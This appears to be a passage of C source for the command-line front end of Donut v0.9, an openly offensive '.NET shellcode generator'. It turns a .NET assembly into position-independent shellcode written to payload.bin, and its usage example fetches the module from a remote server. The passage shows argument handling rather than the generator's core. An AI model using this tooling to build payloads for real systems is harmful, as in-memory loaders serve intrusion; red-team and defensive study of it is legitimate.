    return str;
}

static char* get_param (int argc, char *argv[], int *i) {
    int n = *i;
    if (argv[n][2] != 0) {
      return &argv[n][2];
    }
    if ((n+1) < argc) {
      *i = n + 1;
      return argv[n+1];
    }
    printf("  [ %c%c requires parameter\n", argv[n][0], argv[n][1]);
    exit (0);
}

static void usage (void) {
    printf("\n  usage: donut [options] -f <.NET assembly>\n\n");
    
    printf("       -f <path>            .NET assembly to embed in PIC and DLL.\n");
    printf("       -u <URL>             HTTP server that will host the .NET assembly.\n");
    
    printf("       -c <namespace.class> Optional class name. (required for DLL)\n");
    printf("       -m <method>          Optional method name. (required for DLL)\n");
    printf("       -p <arg1,arg2...>    Optional parameters or command line, separated by comma or semi-colon.\n");
    
    printf("       -a <arch>            Target architecture : 1=x86, 2=amd64, 3=amd64+x86(default).\n");
    printf("       -r <version>         CLR runtime version. v4.0.30319 is used by default.\n");
    printf("       -d <name>            AppDomain name to create for assembly. Randomly generated by default.\n\n");

    printf(" examples:\n\n");
    printf("    donut -a 1 -c TestClass -m RunProcess -p notepad.exe -f loader.dll\n");
    printf("    donut -f loader.dll -c TestClass -m RunProcess -p notepad.exe -u http://remote_server.com/modules/\n");
    
    exit (0);
}

int main(int argc, char *argv[]) {
    DONUT_CONFIG c;
    char         opt;
    int          i, err;
    FILE         *fd;
    char         *arch_str[3] = { "x86", "AMD64", "x86+AMD64" };
    char         *inst_type[2]= { "PIC", "URL"   };
    
    printf("\n");
    printf("  [ Donut .NET shellcode generator v0.9\n");
    printf("  [ Copyright (c) 2019 TheWover, Odzhan\n\n");
    
    // zero initialize configuration
    memset(&c, 0, sizeof(c));
    
    // default type is position independent code for dual-mode (x86 + amd64)
    c.inst_type = DONUT_INSTANCE_PIC;
    c.arch      = DONUT_ARCH_X84;
    
    // parse arguments
    for(i=1; i<argc; i++) {
      // switch?
      if(argv[i][0] != '-' && argv[i][0] != '/') {
        usage();
      }
      opt = argv[i][1];
      
      switch(opt) {
        // target cpu architecture
        case 'a':
          c.arch   = atoi(get_param(argc, argv, &i)) - 1;
          break;
        // name of domain to use
        case 'd':
          strncpy(c.domain, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
          break;
        // assembly to use
        case 'f':
          c.file     = get_param(argc, argv, &i);
          break;
        // runtime version to use
        case 'r':
          strncpy(c.runtime, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
          break;
        // url of remote assembly
        case 'u': {
          strncpy(c.url, get_param(argc, argv, &i), DONUT_MAX_URL - 2);
          c.inst_type = DONUT_INSTANCE_URL;
          break;
        }
        // class
        case 'c':
          c.cls    = get_param(argc, argv, &i);
          break;
        // method
        case 'm':
          c.method = get_param(argc, argv, &i);
          break;
        // parameters to method
        case 'p':
          c.param  = get_param(argc, argv, &i);
          break;
        default:
          usage();
          break;
      }
    }
    
    if(c.file == NULL) {
      usage();
    }
    
    err = DonutCreate(&c);
    
    if(err != DONUT_ERROR_SUCCESS) {
      printf("  [ Error : %s\n", err2str(err));
      return 0;
    }
      
    printf("  [ Instance Type : %s\n", inst_type[c.inst_type]);
    printf("  [ .NET Assembly : \"%s\"\n", c.file  );
    printf("  [ Assembly Type : %s\n", 
      c.mod_type == DONUT_MODULE_DLL ? "DLL" : "EXE"  );
    
    // if this is a DLL, display the class and method
    if(c.mod_type == DONUT_MODULE_DLL) {
      printf("  [ Class         : %s\n", c.cls   );
      printf("  [ Method        : %s\n", c.method);
    }
    // if parameters supplied, display them
    if(c.param != NULL) {
      printf("  [ Parameters    : %s\n", c.param);
    }
    printf("  [ Target CPU    : %s\n", arch_str[c.arch]);
    
    if(c.inst_type == DONUT_INSTANCE_URL) {
      printf("  [ Module name   : %s\n", c.modname);
      printf("  [ Upload to     : %s\n", c.url);
    }
    
    printf("  [ Shellcode     : \"payload.bin\"\n\n");
    fd = fopen("payload.bin", "wb");
    
    if(fd != NULL) {
      fwrite(c.pic, 1, c.pic_len, fd);
      fclose(fd);
    } else {
      printf("  [ Error accessing file.\n");
    }
    DonutDelete(&c);
    return 0;
}
#endif
